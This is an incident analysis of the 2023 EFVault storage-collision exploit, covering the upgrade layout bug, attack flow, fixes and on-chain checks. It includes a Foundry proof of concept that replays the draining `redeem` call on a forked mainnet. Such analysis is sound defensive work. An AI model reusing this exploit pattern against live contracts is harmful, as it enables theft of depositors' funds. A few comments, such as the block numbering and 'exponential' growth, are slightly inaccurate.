# EFVault — Asset Price Manipulation via Storage Collision Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-24 |
| **Protocol** | EFVault |
| **Chain** | Ethereum |
| **Loss** | ~$5,100,000 (USDC) |
| **Attacker** | [0xA095...3A0a](https://etherscan.io/address/0xA0959536560776Ef8627Da14c6E8C91E2c743A0a) |
| **Beneficiary (exploiter)** | [0x8B5A...EFc9](https://etherscan.io/address/0x8B5A8333eC272c9Bca1E43F4d009E9B2FAd5EFc9) |
| **Attack Tx** | [0x1fe5...1914](https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914) |
| **Vulnerable Contract (Proxy)** | [0xBDB5...D336](https://etherscan.io/address/0xBDB515028A6fA6CD1634B5A9651184494aBfD336) |
| **Old Implementation (V3.0)** | [0x5820...82e](https://etherscan.io/address/0x582010c270ef877031e6b16554e51ca5bbda882e) |
| **New Implementation (V4.0)** | [0x80cb...02c](https://etherscan.io/address/0x80cb73074a6965f60df59bf8fa3ce398ffa2702c) |
| **Root Cause** | Storage layout change during upgrade caused slot collision — `assetDecimal` inherited V3's `maxDeposit` value (5e12), inflating the asset conversion factor by 5,000,000x |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/EFVault_exp.sol) |

---

## 1. Vulnerability Overview

EFVault is a yield vault contract with USDC as its underlying asset, deployed using the TransparentUpgradeableProxy pattern.

On February 24, 2023, the team upgraded the implementation from **V3.0 (0x5820…) to V4.0 (0x80cb…)**. V4.0 **inserted** a new variable `assetDecimal` — used in the per-share asset calculation (`assetsPerShare`) — between existing variables.

However, because the storage layout was not validated prior to the upgrade, a **storage collision** occurred. As a result, V4.0's `assetDecimal` (slot 204) read the value previously stored at that slot by V3.0's `maxDeposit`: **5,000,000,000,000 (5e12)**.

The correct decimal precision for USDC is 6, so `assetDecimal` should have been 1,000,000 (1e6); instead, due to the collision, it was assigned a value **5,000,000x** too large. The attacker identified this error and, immediately after the upgrade completed, withdrew **~3.44M USDC** using only a small amount of ENF tokens (676,562 shares).

---

## 2. Vulnerable Code Analysis

### 2.1 Storage Layout Collision (Core Vulnerability)

**V3.0 Implementation (0x582010c2…) — Slot 204: `maxDeposit`**

```solidity
// EFVault V3.0 state variable layout (slots 201–206)
contract EFVault is Initializable, ERC20Upgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable {
    ERC20Upgradeable public asset;        // slot 201
    string public constant version = "3.0";  // constant (no slot)
    address public depositApprover;       // slot 202
    address public controller;            // slot 203
    uint256 public maxDeposit;            // slot 204 ← this slot is critical!
    uint256 public maxWithdraw;           // slot 205
    bool public paused;                   // slot 206
}
```

During V3.0 operation, `setMaxDeposit(5_000_000_000_000)` was called, storing **5,000,000,000,000 (5e12, a 5M USDC deposit cap)** at slot 204.

**V4.0 Implementation (0x80cb7307…) — Slot 204: `assetDecimal` (❌ Collision)**

```solidity
// EFVault V4.0 state variable layout (slots 201–208)
contract EFVault is Initializable, ERC20Upgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable {
    ERC20Upgradeable public asset;        // slot 201
    string public constant version = "4.0";  // constant (no slot)
    address public depositApprover;       // slot 202
    address public controller;            // slot 203
    uint256 private assetDecimal;         // slot 204 ← inherits V3's maxDeposit value (5e12)! ❌
    uint256 public maxWithdraw;           // slot 205
    uint256 public maxDeposit;            // slot 206 ← shifted into V3's paused slot
    address public whiteList;             // slot 207 ← newly added
    bool public paused;                   // slot 208 ← newly added
}
```

**On-chain observed values per slot (block 16696239, just before attack)**

| Slot | V3.0 Interpretation | V4.0 Interpretation | Stored Value |
|------|-----------|-----------|--------|
| 204 | `maxDeposit` = 5,000,000,000,000 | `assetDecimal` = 5,000,000,000,000 ❌ | `0x048c27395000` |
| 205 | `maxWithdraw` = 5,000,000,000,000 | `maxWithdraw` = 5,000,000,000,000 | `0x048c27395000` |
| 206 | `paused` = false | `maxDeposit` = 0 | `0x0` |

### 2.2 Inflated Asset Conversion Function (`assetsPerShare`)

```solidity
// ❌ Vulnerable code — assetDecimal set to 5e12 due to slot collision
function assetsPerShare() internal view returns (uint256) {
    // assetDecimal = 5,000,000,000,000 (should be 1,000,000 under normal conditions)
    // totalAssets = 6,880,910,594,692 (at time of attack)
    // totalSupply = 6,765,625,454,275
    return (IController(controller).totalAssets(false) * assetDecimal * 1e18) / totalSupply();
    // Actual: (6,880,910,594,692 * 5,000,000,000,000 * 1e18) / 6,765,625,454,275
    //       = 5,085,199,174,264,187,730,052,451,758,769 (abnormally large value)
}

// ❌ Vulnerable code — converting shares to assets yields a 5,000,000x inflated result
function redeem(uint256 shares, address receiver)
    public virtual nonReentrant unPaused onlyAllowed returns (uint256 assets)
{
    require(shares > 0, "ZERO_SHARES");
    require(shares <= balanceOf(msg.sender), "EXCEED_TOTAL_BALANCE");

    // 676,562 shares × assetsPerShare / 1e24 = 3,440,452,523,738 USDC units (3.44M USDC)
    // Under normal conditions, only 0.688 USDC should be withdrawn
    assets = (shares * assetsPerShare()) / 1e24; // ❌ 5,000,000x over-withdrawal

    require(assets <= maxWithdraw, "EXCEED_ONE_TIME_MAX_WITHDRAW");
    _withdraw(assets, shares, receiver);
}
```

**Fixed Code (Correct Upgrade Approach for V4.0)**

```solidity
// ✅ Fixed code — preserve existing variable order; append new variables at the end
contract EFVault is Initializable, ERC20Upgradeable, OwnableUpgradeable, ReentrancyGuardUpgradeable {
    ERC20Upgradeable public asset;        // slot 201 (unchanged)
    address public depositApprover;       // slot 202 (unchanged)
    address public controller;            // slot 203 (unchanged)
    uint256 public maxDeposit;            // slot 204 (unchanged) ✅
    uint256 public maxWithdraw;           // slot 205 (unchanged) ✅
    bool public paused;                   // slot 206 (unchanged) ✅
    // New variables must always be appended after existing ones
    uint256 private assetDecimal;         // slot 207 (new) ✅
    address public whiteList;             // slot 208 (new) ✅
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker holds or acquires a small amount of ENF tokens (676,562 shares)
- Monitors the EFVault upgrade transaction and detects the slot collision vulnerability

### 3.2 Execution Phase

1. **Upgrade occurs** (blocks 16696140–16696150): team replaces implementation from V3.0 → V4.0
2. **Vulnerability activates**: V4.0's `assetDecimal` at slot 204 inherits V3.0's `maxDeposit` value (5e12)
3. **Attack executed** (block 16696240): attacker calls `redeem()` with 676,562 ENF tokens

```
┌─────────────────────────────────────────────────────────────────┐
│                     Attacker (0xA095...)                        │
│           ENF balance: 676,562 shares (0.00001% of total)       │
└──────────────────────────┬──────────────────────────────────────┘
                           │ redeem(676562, exploiter)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│            EFVault Proxy (0xBDB5...) V4.0 Implementation        │
│                                                                  │
│  assetsPerShare() calculation:                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  assetDecimal = 5,000,000,000,000  (slot 204 — ❌ collision) │
│  │  totalAssets  = 6,880,910,594,692  (USDC units)          │   │
│  │  totalSupply  = 6,765,625,454,275  (total ENF supply)    │   │
│  │                                                          │   │
│  │  assetsPerShare = totalAssets × assetDecimal × 1e18      │   │
│  │                  ─────────────────────────────────────   │   │
│  │                          totalSupply                     │   │
│  │               = 5.085e30 (5,000,000x normal!)            │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  Withdrawal asset calculation:                                   │
│  assets = 676,562 × assetsPerShare / 1e24                       │
│         = 3,440,452,523,738 USDC units ≈ 3,440,452 USDC         │
│  (should be 0.688 USDC under normal conditions!)                 │
└──────────────────────────┬──────────────────────────────────────┘
                           │ withdraw(3,440,452 USDC, exploiter)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              Controller (0xf491...) / Notional Finance          │
│  Redeems cUSDC + cDAI to obtain ~3.44M USDC + 0.60M DAI        │
└──────────────────────────┬──────────────────────────────────────┘
                           │ DAI → USDC swap (Curve)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              Beneficiary (0x8B5A...) receives USDC              │
│              Final profit: ~3,436,919 USDC (~$3.44M USD)        │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Field | Value |
|------|-----|
| Shares used in attack | 676,562 ENF |
| Expected withdrawal (normal) | 0.688 USDC |
| Actual withdrawal | ~3,440,452 USDC |
| Excess withdrawal multiplier | ~5,000,000x |
| Attacker net profit | 3,436,919 USDC (after fees, etc.) |
| Total protocol loss | ~5,100,000 USD |

> The attack was completed in a single transaction (Tx: `0x1fe5...`).

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1630490333716029440
// https://twitter.com/drdr_zz/status/1630500170373685248
// https://twitter.com/gbaleeeee/status/1630587522698080257
// @TX
// https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914

// Interface definitions for ENF token (EFVault's share token) and USDC
interface IENF is IERC20 {
    function redeem(uint256 shares, address receiver) external;
}

contract ContractTest is Test {
    // EFVault proxy contract (ENF LP token) — the vulnerable target
    IENF ENF = IENF(0xBDB515028A6fA6CD1634B5A9651184494aBfD336);
    // USDC token to receive withdrawal
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // Actual attacker address (profit recipient)
    address exploiter = 0x8B5A8333eC272c9Bca1E43F4d009E9B2FAd5EFc9;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // Fork the block immediately after the attack (16696239) — V4.0 implementation already deployed
        // Note: the actual attack occurred at block 16696240
        cheats.createSelectFork("mainnet", 16_696_239);
    }

    function testExploit() external {
        // PoC simplification: deal the attacker 1e18 ENF tokens arbitrarily
        // In reality, attacker used 676,562 ENF (0.00001% of totalSupply)
        deal(address(ENF), address(this), 1e18);

        // Impersonate attacker and call redeem
        cheats.startPrank(address(this), address(this));
        // Key: call redeem with only 676,562 shares
        // → assetDecimal collision causes assets to be returned 5,000,000x inflated
        // → results in successful withdrawal of ~3.44M USDC
        ENF.redeem(676_562, exploiter);
        cheats.stopPrank();

        // Output result: check exploiter's USDC balance
        emit log_named_decimal_uint(
            "Exploiter USDC balance after exploit",
            USDC.balanceOf(exploiter),
            USDC.decimals()
        );
    }
}
```

**Core of the attack**:
- Attack completed with a single line: `redeem(676_562, exploiter)`
- Since this occurs immediately after the V4.0 upgrade, `assetDecimal` (slot 204) still holds V3's `maxDeposit` value of 5e12
- Achieved purely through storage collision — no flash loans or DEX manipulation required

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Upgrade Storage Layout Collision | CRITICAL | CWE-665 | `08_initialization.md` | Audius (2022), Nomad (2022) |
| V-02 | Price Manipulation via Inflated Asset Calculation | CRITICAL | CWE-682 | `04_oracle_manipulation.md` | Hundred Finance (2023) |
| V-03 | Missing Post-Upgrade Initialization | HIGH | CWE-909 | `08_initialization.md` | — |

### V-01: Upgrade Storage Layout Collision

- **Description**: When upgrading from V3.0 to V4.0, the new variable `assetDecimal` was inserted between existing variables, causing the value stored at slot 204 (5e12, previously used as `maxDeposit` by the old implementation) to be reinterpreted as `assetDecimal`.
- **Impact**: The `assetsPerShare()` calculation is inflated 5,000,000x, allowing the entire vault's assets to be withdrawn using a negligible amount of shares.
- **Attack Condition**: State where `assetDecimal` was not correctly set via `reinitialize` after the upgrade completed.

### V-02: Inflated Asset Conversion Price

- **Description**: In the formula `assetsPerShare = (totalAssets × assetDecimal × 1e18) / totalSupply`, `assetDecimal` takes the abnormal value (5e12), causing the returned asset amount to grow exponentially.
- **Impact**: Attacker holding only 0.00001% of total shares is able to withdraw approximately 50% of all vault assets.
- **Attack Condition**: Automatically exploitable when V-01 occurs. No additional manipulation required.

### V-03: Missing Post-Upgrade Initialization

- **Description**: When upgrading to V4.0, which adds new variables (`assetDecimal`, `whiteList`), the `reinitializer` function that initializes these variables to correct values was not called.
- **Impact**: `assetDecimal` is never set to the correct value (1e6), so the collided value from V-01 is used as-is.
- **Attack Condition**: Attack conditions are met by the upgrade transaction alone.

---

## 6. Remediation Recommendations

### Immediate Actions

**Mandate `reinitializer` function call in upgrade scripts**:

```solidity
// ✅ Fix: add reinitializer function to V4.0
function initializeV4(
    uint256 _assetDecimal,
    address _whiteList
) public reinitializer(4) onlyOwner {
    // Set assetDecimal to the correct value (1e6 for USDC)
    assetDecimal = _assetDecimal;    // ✅ e.g., 1_000_000
    whiteList = _whiteList;          // ✅ set whitelist address
}
```

```solidity
// ✅ Fix: execute upgrade + initialization atomically
proxy.upgradeToAndCall(
    newImpl,
    abi.encodeCall(EFVault.initializeV4, (1_000_000, whiteListAddr))
);
```

**New variables must always be appended after existing variables**:

```solidity
// ❌ Incorrect approach — inserting between existing variables
contract EFVault_V4_BAD {
    ERC20Upgradeable public asset;    // slot 201
    address public depositApprover;   // slot 202
    address public controller;        // slot 203
    uint256 private assetDecimal;     // ❌ inserted at slot 204 — collision occurs!
    uint256 public maxDeposit;        // slot 204 → shifted to 205
    uint256 public maxWithdraw;       // slot 205 → shifted to 206
}

// ✅ Correct approach — append new variables at the end
contract EFVault_V4_GOOD {
    ERC20Upgradeable public asset;    // slot 201 (unchanged) ✅
    address public depositApprover;   // slot 202 (unchanged) ✅
    address public controller;        // slot 203 (unchanged) ✅
    uint256 public maxDeposit;        // slot 204 (unchanged) ✅
    uint256 public maxWithdraw;       // slot 205 (unchanged) ✅
    bool public paused;               // slot 206 (unchanged) ✅
    // New variables must always be added at the very end
    uint256 private assetDecimal;     // slot 207 ✅
    address public whiteList;         // slot 208 ✅
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Storage layout collision | Automate layout validation in CI/CD using OpenZeppelin `Upgrade Safety` plugin |
| New variable insertion | Use `@custom:storage-location` annotation or adopt a dedicated storage pattern (Diamond) |
| Missing initialization | Establish a policy mandating `upgradeToAndCall` in upgrade scripts |
| Reliance on default values for new variables | Include per-slot on-chain value vs. expected value comparison tests in upgrade review |
| Attack detection | Build on-chain monitoring to detect abnormally large withdrawals |

---

## 7. Lessons Learned

1. **Never insert variables in the middle of an upgradeable contract's layout**: New state variables must always be appended to the end of the existing layout. Inserting them in the middle causes previously stored values at those slots to be reinterpreted as different types, resulting in critical bugs.

2. **Upgrade and initialization must be performed atomically**: Calling only `upgradeTo()` and separating new variable initialization into a different transaction leaves an open window between the two transactions for an attacker to exploit the vulnerable state. Always use `upgradeToAndCall()` to handle upgrade and initialization in a single transaction.

3. **Mandatory storage layout validation before upgrades**: OpenZeppelin's `Upgrade Safety` or `hardhat-upgrades` plugins detect storage layout collisions at compile time. Integrate these into your CI pipeline.

4. **Attacks can happen immediately after upgrade**: In this incident, the attacker executed the attack just **90 blocks (~18 minutes)** after the upgrade block (16696140–16696150). If a temporary vulnerable state exists after an upgrade, a procedure of pausing and confirming safety before resuming is necessary.

5. **On-chain verification of critical variables after upgrade**: Include assertions such as `assert(assetDecimal == expectedValue)` in deployment scripts to confirm that slot values match expectations after the upgrade completes.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Expected Value | On-Chain Actual Value | Match |
|------|-----------|-------------|------|
| Attack block | 16,696,240 | 16,696,240 | ✅ |
| Attacker from | 0xA095... | 0xA095...3A0a | ✅ |
| Called function | `redeem(uint256,address)` | `0x7bde82f2` (redeem) | ✅ |
| Shares used | 676,562 | 676,562 (`0x0A52D2`) | ✅ |
| USDC withdrawn (exploiter) | ~3,440,000 | 3,436,919,328,971 units ≈ 3,436,919 USDC | ✅ |
| ENF totalSupply before attack | — | 6,765,625,454,275 | Confirmed |
| totalAssets before attack | — | 6,880,910,594,692 USDC units ≈ 6,880,910 USDC | Confirmed |

### 8.2 On-Chain Event Log Sequence (Block 16696240, 41 events total)

```
[6]  Transfer: cUSDC cToken → Notional Finance (2,836,751,750,498 cUSDC)
[7]  Transfer: Notional → cToken (12,468,202,524,839,765 units)
[9]  Transfer: Notional → intermediate address (2,836,751,750,498)
[10] Transfer: Notional → intermediate address (1,288,702,247,408 cDAI)
[13] Transfer: cUSDC → Controller (2,836,751,750,498)
[19] Transfer: cDAI → Notional (603,661,911,486,835,632,293,702 cDAI units)
[22] Transfer: Notional → DAI pool (603,661,911,486,835,632,293,702 units)
[28] Transfer: DAI pool → Curve (603,661,911,486,835,632,293,702 DAI)
[31] Transfer: Curve → USDC recipient (result of DAI → USDC swap)
[32] Transfer: USDC recipient → intermediate (603,607,938,161 USDC)
[34] Transfer: USDC → intermediate address (603,607,938,161)
[36] Transfer: intermediate → Controller (603,607,938,161)
[37] Transfer: Controller → fee recipient (3,440,359,688 USDC ≈ 3,440 USDC)
[38] Transfer: Controller → exploiter (3,436,919,328,971 USDC ≈ 3,436,919 USDC) ← attacker profit
[39] Transfer: attacker → 0x0 (676,562 ENF burned) ← shares burned
[40] Withdraw event: emitted by EFVault contract
```

### 8.3 Pre-condition Verification (Block 16696239, Just Before Attack)

| Check Item | Value |
|----------|-----|
| Attacker ENF balance | 148,236,774 shares |
| EFVault direct USDC holdings | 0 USDC (deposited into controller) |
| `assetDecimal` slot 204 value | 5,000,000,000,000 (5e12 — collision value) |
| `maxWithdraw` slot 205 value | 5,000,000,000,000 (5e12) |
| Implementation address | 0x80cb73074a6965f60df59bf8fa3ce398ffa2702c (V4.0) |
| Upgrade completion block | 16,696,140–16,696,150 (90 blocks before attack) |
| Total supply (totalSupply) | 6,765,625,454,275 ENF |
| Controller totalAssets | 6,880,910,594,692 (≈ 6.88M USDC) |